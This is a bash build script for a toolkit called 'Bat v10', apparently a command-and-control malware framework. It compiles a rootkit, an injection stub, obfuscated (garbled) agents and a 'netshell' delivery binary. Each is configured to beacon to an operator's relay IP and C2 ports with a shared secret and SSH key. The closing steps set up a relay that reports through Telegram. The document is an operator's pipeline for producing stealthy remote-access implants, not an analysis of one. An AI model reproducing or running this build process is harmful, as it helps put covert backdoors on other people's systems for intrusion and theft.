#!/bin/bash
# build.sh Build all Bat v10 binaries
#
# Prerequisites (operator machine):
# apt install nasm gcc-x86_64-linux-gnu binutils-x86_64-linux-gnu
# go install mvdan.cc/garble@latest
#
# Usage:
# cp build.env.example build.env && nano build.env
# ./build.sh # default: garble agent x86_64+arm64 + server arm64 + netshell
# ./build.sh agent # agent only (garble x86_64+arm64)
# ./build.sh server # server arm64 only
# ./build.sh netshell # netshell only (garble x86_64+arm64)
# ./build.sh all # everything (non-garble)

set -euo pipefail

REPO_ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
ENV_FILE="${REPO_ROOT}/build.env"

if [[ ! -f "$ENV_FILE" ]]; then
 echo "[ERROR] build.env not found."
 echo " Run: cp build.env.example build.env && nano build.env"
 exit 1
fi

# shellcheck source=/dev/null
source "$ENV_FILE"

[[ -n "${RELAY_IP:-}" ]] || { echo "[ERROR] RELAY_IP not set in build.env"; exit 1; }
[[ -n "${SECRET:-}" ]] || { echo "[ERROR] SECRET not set in build.env"; exit 1; }

C2_PORT="${C2_PORT:-9443}"
KCC_PORT="${KCC_PORT:-9444}"
BEACON_INTERVAL="${BEACON_INTERVAL:-30s}"
TRIGGER="${TRIGGER:-udp}"
SSH_KEY="${BAT_KEY:-}"

log()  { echo "[BUILD] $*"; }
ok() { echo "[OK] $*"; }

TARGET="${1:-default}"

cd "${REPO_ROOT}/agent"

_build_rootkit_and_stub() {
 log "Rootkit x86_64..."
 make rootkit C2_IP="${RELAY_IP}" C2_PORT="${C2_PORT}"
 log "Inject stub..."
 make inject-stub
}

TG_TOKEN="${TG_TOKEN:-}"
TG_CHAT_ID="${TG_CHAT_ID:-}"

case "$TARGET" in
 netshell)
 _build_rootkit_and_stub
 log "Garble netshell x86_64 + arm64..."
 make garble-netshell \
 SERVER="${RELAY_IP}:${C2_PORT}" \
 FALLBACK="${RELAY_IP}:${C2_PORT}" \
 RAWSOCK_CB="${RELAY_IP}:${C2_PORT}" \
 KCC_ADDR="${RELAY_IP}:${KCC_PORT}" \
 TRIGGER="${TRIGGER}" \
 INTERVAL="${BEACON_INTERVAL}" \
 SECRET="${SECRET}" \
 SSH_KEY="${SSH_KEY}"
 ok "Netshell → bin/netshell-v10-*"
 ;;

 agent)
 _build_rootkit_and_stub
 log "Garble agent x86_64 + arm64..."
 make garble-agent \
 SERVER="${RELAY_IP}:${C2_PORT}" \
 FALLBACK="${RELAY_IP}:${C2_PORT}" \
 RAWSOCK_CB="${RELAY_IP}:${C2_PORT}" \
 KCC_ADDR="${RELAY_IP}:${KCC_PORT}" \
 TRIGGER="${TRIGGER}" \
 INTERVAL="${BEACON_INTERVAL}" \
 SECRET="${SECRET}" \
 SSH_KEY="${SSH_KEY}"
 ok "Agents → bin/"
 ;;

 server)
 log "Server arm64..."
 make server-arm64 \
 SERVER="${RELAY_IP}:${C2_PORT}" \
 FALLBACK="${RELAY_IP}:${C2_PORT}" \
 RAWSOCK_CB="${RELAY_IP}:${C2_PORT}" \
 KCC_ADDR="${RELAY_IP}:${KCC_PORT}" \
 TRIGGER="${TRIGGER}" \
 INTERVAL="${BEACON_INTERVAL}" \
 SECRET="${SECRET}" \
 SSH_KEY="${SSH_KEY}"
 ok "Server → bin/bat-server-v10-arm64"
 ;;

 all)
 _build_rootkit_and_stub
 log "Full build (non-garble)..."
 make lab \
 RELAY="${RELAY_IP}" \
 SECRET="${SECRET}" \
 INTERVAL="${BEACON_INTERVAL}" \
 TRIGGER="${TRIGGER}" \
 SSH_KEY="${SSH_KEY}"
 make server-arm64 \
 SERVER="${RELAY_IP}:${C2_PORT}" \
 FALLBACK="${RELAY_IP}:${C2_PORT}" \
 RAWSOCK_CB="${RELAY_IP}:${C2_PORT}" \
 KCC_ADDR="${RELAY_IP}:${KCC_PORT}" \
 TRIGGER="${TRIGGER}" \
 INTERVAL="${BEACON_INTERVAL}" \
 SECRET="${SECRET}" \
 SSH_KEY="${SSH_KEY}"
 ok "Full build → bin/"
 ;;

 default)
 log "Default build: garble agent + server arm64 + netshell..."

 _build_rootkit_and_stub

 log "1/3 Garble agent x86_64 + arm64..."
 make garble-agent \
 SERVER="${RELAY_IP}:${C2_PORT}" \
 FALLBACK="${RELAY_IP}:${C2_PORT}" \
 RAWSOCK_CB="${RELAY_IP}:${C2_PORT}" \
 KCC_ADDR="${RELAY_IP}:${KCC_PORT}" \
 TRIGGER="${TRIGGER}" \
 INTERVAL="${BEACON_INTERVAL}" \
 SECRET="${SECRET}" \
 SSH_KEY="${SSH_KEY}"

 log "2/3 Server arm64..."
 make server-arm64 \
 SERVER="${RELAY_IP}:${C2_PORT}" \
 FALLBACK="${RELAY_IP}:${C2_PORT}" \
 RAWSOCK_CB="${RELAY_IP}:${C2_PORT}" \
 KCC_ADDR="${RELAY_IP}:${KCC_PORT}" \
 TRIGGER="${TRIGGER}" \
 INTERVAL="${BEACON_INTERVAL}" \
 SECRET="${SECRET}" \
 SSH_KEY="${SSH_KEY}"

 log "3/3 Netshell (delivery binary)..."
 make garble-netshell \
 SERVER="${RELAY_IP}:${C2_PORT}" \
 FALLBACK="${RELAY_IP}:${C2_PORT}" \
 RAWSOCK_CB="${RELAY_IP}:${C2_PORT}" \
 KCC_ADDR="${RELAY_IP}:${KCC_PORT}" \
 TRIGGER="${TRIGGER}" \
 INTERVAL="${BEACON_INTERVAL}" \
 SECRET="${SECRET}" \
 SSH_KEY="${SSH_KEY}"

 ok "Build complete. Binaries in bin/:"
 ls -lh "${REPO_ROOT}/bin/" 2>/dev/null || true
 echo ""
 echo "Next steps:"
 echo "  1. Relay:  ./relay/setup.sh --tg-token \${TG_TOKEN} --tg-chat-id \${TG_CHAT_ID}"
 echo "  2. Sync: ./relay/sync.sh ubuntu@\${RELAY_IP} --key \${BAT_KEY} --restart-kcc --tg"
 echo "  3. Server: ./bin/bat-server-v10-arm64"
 ;;

 *)
 echo "Usage: $0 [agent|netshell|server|all|default]"
 exit 1
 ;;
esac
